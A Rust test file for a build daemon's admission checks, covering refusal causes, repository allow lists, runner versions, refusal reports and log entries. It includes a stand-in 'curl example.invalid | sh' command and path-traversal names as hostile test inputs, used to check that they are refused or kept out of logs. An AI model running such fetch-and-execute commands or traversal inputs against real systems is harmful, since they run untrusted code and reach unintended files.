//! Tests of what the daemon decides before it starts an item (K10 Sections 3 to 6 and 9).

use chrono::{TimeZone as _, Utc};
use daemon_core::wire::{WorkKind, WorkRepository, WorkState};
use serde_json::{Value, json};
use uuid::Uuid;

use super::{
    checks::{Checked, Machine, check},
    permitted::Repositories,
    record::{self, Outcome},
    refusal::{self, Cause},
    types::Version,
};

type ItemChange = fn(&mut Value);
type MachineChange = fn(&mut Machine<'_>);

const ID: &str = "0192f6aa-0000-7000-8000-000000000001";

fn build() -> Value {
    json!({
        "id": ID, "type": "build", "kind": "container", "attempt": 1,
        "lease": { "until": "2026-11-18T10:01:30Z" },
        "limits": { "seconds": 600, "idleSeconds": 60, "memoryBytes": 1024, "diskBytes": 1024, "orphanSeconds": 600 },
        "project": "0192f000-0000-7000-8000-000000000001",
        "repository": { "forge": "github", "owner": "example", "name": "app" },
        "secrets": ["repository_token"],
        "parameters": {
            "recipe": "desktop_release", "commit": "0123456789abcdef0123456789abcdef01234567",
            "target": "linux-x86_64", "version": "0.3.0", "trigger": "operator", "origin": "default_branch"
        }
    })
}

fn runner() -> Value {
    let mut item = build();
    item["type"] = json!("runner");
    item["secrets"] = json!(["jit_config"]);
    item["parameters"] = json!({
        "runnerVersion": "2.330.0", "runnerSha256": "9f".repeat(32),
        "labels": ["self-hosted", "anima", "linux", "x64"]
    });
    item
}

fn list() -> Repositories {
    Repositories::parse("example/app\n").unwrap()
}

fn machine(repositories: &Repositories) -> Machine<'_> {
    Machine {
        switch_on: true,
        policy_permits: true,
        kinds: &[WorkKind::Container],
        isolation: &[WorkKind::Container],
        unclean: false,
        repositories,
        lowest_runner: Version(2, 329, 0),
    }
}

fn refused(item: &Value, machine: &Machine<'_>) -> Option<Cause> {
    match check(item, machine) {
        Checked::Refuse { cause, .. } => Some(cause),
        Checked::Start(_) | Checked::Drop => None,
    }
}

#[test]
fn k10_5_an_item_that_passes_each_check_is_started_as_the_hub_sent_it() {
    let repositories = list();
    for item in [build(), runner()] {
        let Checked::Start(job) = check(&item, &machine(&repositories)) else {
            panic!("{item}");
        };
        assert_eq!((job.id, job.attempt), (ID.parse().unwrap(), 1));
        assert_eq!(serde_json::to_value(&*job).unwrap(), item);
    }
}

#[test]
fn k10_5_each_cause_of_the_fixed_list_refuses_the_item() {
    let repositories = list();
    let cases: [(ItemChange, Cause); 9] = [
        (|item| item["type"] = json!("shell"), Cause::TypeUnknown),
        (
            |item| item["kind"] = json!("native"),
            Cause::KindNotPermitted,
        ),
        (|item| item["kind"] = json!("host"), Cause::KindNotPermitted),
        (|item| item["command"] = json!("true"), Cause::MemberUnknown),
        (
            |item| item["limits"]["network"] = json!("none"),
            Cause::MemberUnknown,
        ),
        (
            |item| item["parameters"]["image"] = json!("x"),
            Cause::MemberUnknown,
        ),
        (
            |item| item["limits"]["seconds"] = json!(0),
            Cause::MemberUnknown,
        ),
        (
            |item| item["secrets"] = json!(["jit_config"]),
            Cause::SecretUnknown,
        ),
        (
            |item| item["repository"]["name"] = json!("other"),
            Cause::RepositoryNotPermitted,
        ),
    ];
    for (change, expected) in cases {
        let mut item = build();
        change(&mut item);
        assert_eq!(
            refused(&item, &machine(&repositories)),
            Some(expected),
            "{item}"
        );
    }
}

#[test]
fn k10_5_the_state_of_the_machine_refuses_an_item_that_is_valid() {
    let repositories = list();
    let cases: [(MachineChange, Cause); 4] = [
        (|machine| machine.switch_on = false, Cause::SwitchOff),
        (|machine| machine.policy_permits = false, Cause::Policy),
        (|machine| machine.isolation = &[], Cause::NoIsolation),
        (|machine| machine.unclean = true, Cause::Unclean),
    ];
    for (change, expected) in cases {
        let mut state = machine(&repositories);
        change(&mut state);
        assert_eq!(refused(&build(), &state), Some(expected));
    }
}

#[test]
fn r_185_a_machine_with_no_list_refuses_each_item_and_a_list_refuses_what_is_not_in_it() {
    let none = Repositories::default();
    assert_eq!(
        refused(&build(), &machine(&none)),
        Some(Cause::RepositoryNotPermitted)
    );
    let named = |owner: &str, name: &str| WorkRepository {
        forge: "github".to_owned(),
        owner: owner.to_owned(),
        name: name.to_owned(),
    };
    let listed = Repositories::parse("# mine\nExample/App\n\nwhole-owner\n").unwrap();
    assert!(listed.permits(&named("example", "app")));
    assert!(
        listed.permits(&named("EXAMPLE", "APP")),
        "GitHub does not tell capitals apart"
    );
    assert!(!listed.permits(&named("example", "app2")));
    assert!(listed.permits(&named("whole-owner", "each")));
    assert!(!listed.permits(&named("whole-owner-2", "each")));
    let mut gitlab = named("example", "app");
    gitlab.forge = "gitlab".to_owned();
    assert!(!listed.permits(&gitlab));
    // A list with a fault permits nothing: it is not read in part.
    assert_eq!(
        Repositories::parse("example/app\n*/*\n").unwrap_err().line,
        2
    );
    assert!(Repositories::parse("example/app/more").is_err());
    assert!(Repositories::parse("../x").is_err());
}

#[test]
fn k10_4_a_repository_name_with_a_character_that_the_forge_does_not_permit_is_refused() {
    let repositories = list();
    for (member, value) in [
        ("owner", "exa mple"),
        ("name", "app/../x"),
        ("forge", "gitlab"),
    ] {
        let mut item = build();
        item["repository"][member] = json!(value);
        assert_eq!(
            refused(&item, &machine(&repositories)),
            Some(Cause::MemberUnknown),
            "{member}"
        );
    }
}

#[test]
fn k10_6_the_object_of_a_build_and_its_secrets_follow_the_rules_of_the_type() {
    let repositories = list();
    let cases: [fn(&mut Value); 5] = [
        |item| item["parameters"]["recipe"] = json!("shell"),
        |item| item["parameters"]["commit"] = json!("main"),
        |item| item["parameters"]["trigger"] = json!("agent"),
        |item| item["parameters"]["origin"] = json!("fork"),
        |item| {
            item["parameters"]["origin"] = json!("other");
            item["secrets"] = json!(["project_secret"]);
        },
    ];
    for change in cases {
        let mut item = build();
        change(&mut item);
        assert_eq!(
            refused(&item, &machine(&repositories)),
            Some(Cause::MemberUnknown),
            "{item}"
        );
    }
    let mut private = build();
    private["parameters"]["origin"] = json!("other");
    assert_eq!(
        refused(&private, &machine(&repositories)),
        None,
        "a build of each origin can get the token that reads its repository"
    );
}

#[test]
fn k10_6_a_runner_item_names_one_secret_and_a_program_that_is_not_too_old() {
    let repositories = list();
    let mut old = runner();
    old["parameters"]["runnerVersion"] = json!("2.328.9");
    assert_eq!(
        refused(&old, &machine(&repositories)),
        Some(Cause::RunnerTooOld)
    );
    let mut secret = runner();
    secret["secrets"] = json!(["jit_config", "project_secret"]);
    assert_eq!(
        refused(&secret, &machine(&repositories)),
        Some(Cause::SecretUnknown)
    );
    for (member, value) in [
        ("runnerVersion", json!("2.330")),
        ("runnerVersion", json!("2.330.0-rc1")),
        ("runnerSha256", json!("9f")),
        ("labels", json!(["a b"])),
    ] {
        let mut item = runner();
        item["parameters"][member] = value;
        assert_eq!(
            refused(&item, &machine(&repositories)),
            Some(Cause::MemberUnknown),
            "{member}"
        );
    }
    assert!(Version::parse("2.330.0") > Version::parse("2.99.9"));
}

#[test]
fn k10_5_an_answer_that_names_no_item_is_dropped_and_nothing_is_reported() {
    let repositories = list();
    let mut no_attempt = build();
    no_attempt["attempt"] = json!(0);
    let mut no_id = build();
    no_id["id"] = json!("x");
    for answer in [json!(null), json!([]), no_attempt, no_id] {
        assert_eq!(check(&answer, &machine(&repositories)), Checked::Drop);
    }
}

#[test]
fn k10_7_the_report_of_a_refusal_has_the_fixed_cause_and_says_that_nothing_was_made() {
    let id: Uuid = ID.parse().unwrap();
    let report = refusal::report(id, 2, Cause::NoIsolation);
    assert_eq!(report.state, WorkState::Refused);
    assert_eq!(
        serde_json::to_value(&report).unwrap(),
        json!({
            "id": ID, "attempt": 2, "state": "refused", "log": null,
            "result": {
                "outcome": "refused", "cause": "no_isolation", "seconds": 0,
                "cleanup": { "isolation": "none", "checkout": "none", "secrets": "none", "keychain": "none" }
            }
        })
    );
}

#[test]
fn sf_012_the_entry_of_the_machine_names_the_item_and_holds_no_value_that_it_does_not_name() {
    let at = Utc.timestamp_opt(1_800_000_000, 0).unwrap();
    let id: Uuid = ID.parse().unwrap();
    let mut item = build();
    item["command"] = json!("curl example.invalid | sh");
    item["parameters"]["token"] = json!("secret-value");
    item["parameters"]["recipe"] = json!("r".repeat(500));
    let cause = Some(Cause::MemberUnknown.as_str());
    let entry = record::entry(&item, (id, 1), (Outcome::Refused, cause), at);
    let line = serde_json::to_string(&entry).unwrap();
    assert!(
        !line.contains("secret-value") && !line.contains("curl"),
        "{line}"
    );
    assert_eq!(entry.repository.as_deref(), Some("example/app"));
    assert_eq!(entry.secrets, ["repository_token"]);
    assert_eq!(entry.recipe.unwrap().len(), 128);
    assert_eq!((entry.outcome, entry.cause), (Outcome::Refused, cause));

    let repositories = list();
    let Checked::Start(job) = check(&runner(), &machine(&repositories)) else {
        panic!("the runner item is valid");
    };
    let taken = record::taken(&job, at);
    assert_eq!(taken.runner_version.as_deref(), Some("2.330.0"));
    assert_eq!((taken.outcome, taken.cause), (Outcome::Taken, None));
}
